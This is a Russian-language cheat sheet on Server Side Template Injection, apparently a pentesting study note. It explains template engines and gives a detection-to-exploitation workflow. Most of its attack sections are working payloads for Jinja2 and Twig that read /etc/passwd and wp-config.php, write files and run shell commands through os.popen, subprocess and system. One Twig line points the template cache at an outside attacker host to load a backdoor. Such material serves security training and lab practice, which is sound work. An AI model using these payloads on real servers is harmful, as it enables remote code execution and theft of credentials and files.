# SSTI - Server Side Template Injection
Server Side Template Injection – это уязвимость (то есть вид атаки на шаблонизаторы), при которой непосредственная вставка пользовательских данных в шаблон может спровоцировать критическую уязвимость в системе.

Template Injection может возникнуть, если пользовательские данные вставляются в шаблон без какой-либо валидации (или с плохой валидацией)

Веб-шаблон – это некоторый тематический html документ, который не является полноценной html страницей, а лишь оболочкой для каких-либо данных. Для ассоциативного ряда можно представить вебшаблон как бланк принятия посылки с почты. Бланк имеет общую структуру (графу ФИО, телефон, получатель, отправитель и так далее).Таких бланков много и все они одинаковые для каждого человека, который будет ее заполнять. Но каждый заполняет ее своими данными.

Шаблонизатор – это программное обеспечение, позволяющее использовать шаблоны для генерации конечных html-страниц. Другими словами, именно шаблонизатор занимается отделением представления конечного результата от исполняемого кода, который в свою очередь заполняет определенными данными шаблон 

|    Среда        | Описание                      
|----------------|-------------------------------|
|Java|Apache, Velocity, FreeMarker, Histone  |    
|PHP  |BH, Fenom, Smarty, Twig, TinyButStrong, XTemplate, Histone, Separate, Blade, Sigma, PHPTAL, Facebook, XHP, dwoo, Blitz, templates | 
|Python | Genshi, Kid, Jinja2, Mako |
|Perl|Template, Toolkit, HTML::Template|
|Ruby |Ruby, Erubis, Haml, Slim, Liquid |
|JS |bem-xjst, BH, Handlebars, Underscore, pug, Histone |


При тестировании веб приложения уязвимости SSTI следует
придерживаться следующего алгоритма:
- Обнаружение
- Идентификация
- Эксплуатация: Чтение --> Исследование --> Атака

 ### Обнаружение
 ```
{{7*7}}
${7*7}
<%= 7*7%>
${{7*7}}
#{7*7}
*{7*7}
```
## [!Все payloads](https://github.com/LostErr0r/Bestiary/tree/main/payloads/SSTI)

### Идентификация

![Идентификация](https://github.com/user-attachments/assets/eb6fc930-4d4a-4bae-9455-683fb8b2d622)



### Эксплуатация (чтение)

В документации есть ключевые части, которые следует просмотреть с точки зрения эксплуатации уязвимости:
- Раздел «For Template Authors» описывает базовый синтаксис;
- «Security Considerations» - есть огромный шанс, что разработчики веб приложения не читали данный раздел;
- Список встроенных функций, методов и переменных;
- Список дополнений и расширений — некоторые из них могут быть включены по умолчанию.

### Эксплуатация (Исследование)
Многие шаблонизаторы имеют объект «self», который предоставляет информацию обо всех других объектах и методах. Если же объекта self нет, то можно попробовать профаззить объекты с помощью инструментов Burp Suite или Wfuzz и словарей с готовыми полезными нагрузками (Seclists, FuzzDB)

### Эксплуатация (Атака)

Допустим, было обнаружено веб приложение, уязвимое к SSTI. Также было обнаружено, что приложение использует шаблонизатор Jinja2. Тогда можно проэксплуатировать уязвимость следующим образом: например, добьемся чтения локального файла сервера. Так как шаблонизатор написан на Python, будем использовать функции mro и subclasses ().


### Суть SSTI заключается в том, чтобы использовать методы языка, на которых написан шаблонизатор, в своих целях.

Краткое описание классов, методов и атрибутов:
```
__class__ возвращает объект, которому принадлежит тип
__mro__ возвращает кортеж, содержащий базовые классы, унаследованные объектом, и метод анализируется в порядке кортежей во время синтаксического анализа.
__base__ возвращает базовый класс, унаследованный этим объектом
// __base__ и__mro__ используется для поиска базового класса.
__subclasses__ Каждый новый класс сохраняет ссылки на подклассы. Этот метод возвращает список ссылок, которые все еще доступны в классе.
__init__ метод инициализации класса
__globals__ Ссылка на словарь, содержащий глобальные переменные функции.
```
#### Атрибут __mro__ в Python позволяет «двигаться» по древу и наследовать вверх к суперклассу, а функция subclasses () позволяет «двигаться» вниз к наследникам. Таким образом, можно «выбраться» из одного класса и воспользоваться другим.
```
{''.__class__}}
{{''.__class__.__mro__}}
{{''.__class__.__mro__[2]. Subclasses__()}}
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
```



# Cheet shet
### Jinja2

#### Получение списка классов:
```
{{ [].class.base.subclasses() }}
{{''.class.mro()[1].subclasses()}}
{{ ''.__class__.__mro__[2].__subclasses__() }}
```
#### Чтение файлов с удаленного сервера:
```
# ''.__class__.__mro__[2].__subclasses__()[40] = File class
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/tmp/flag").read() }}
# https://github.com/pallets/flask/blob/master/src/flask/helpers.py#L398
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
```
#### Запись в файл на удаленном сервере:
```
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt','w').write('Hello here !') }}
```
#### Выполнение файлов на удаленном сервере:
```
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```
#### Для Python 3
 #### Чтение файлов с удаленного сервера:
```
{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[%27open%27](%27/etc/passwd%27).read()}}
```
#### Выполнение файлов на удаленном сервере:
```
{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['eval']("_
_import__('os').popen('id').read()")}}
{{''.__class__.__mro__[1].__subclasses__()[280]('id', shell=True, stdout=-1).communicate()}}
{{''.__class__.__bases__[0].__subclasses__()[117].__init__.__globals__['popen']('id').read()}}
```

### Twig

#### Чтение файлов с удаленного сервера:
```
"{{'/etc/passwd'|file_excerpt(1,30)}}"@
{{include("wp-config.php")}}
```
#### Выполнение файлов на удаленном сервере:
```
{{self}}
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
{{[0]|reduce('system','id')}}
{{['id']|map('system')|join}}
{{['id',1]|sort('system')|join}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}
```
### Практика
- [portswiger](https://portswigger.net/web-security/all-labs#server-side-template-injection)


### Ссылки
- https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2
- https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti
- https://book.hacktricks.xyz/todo/references
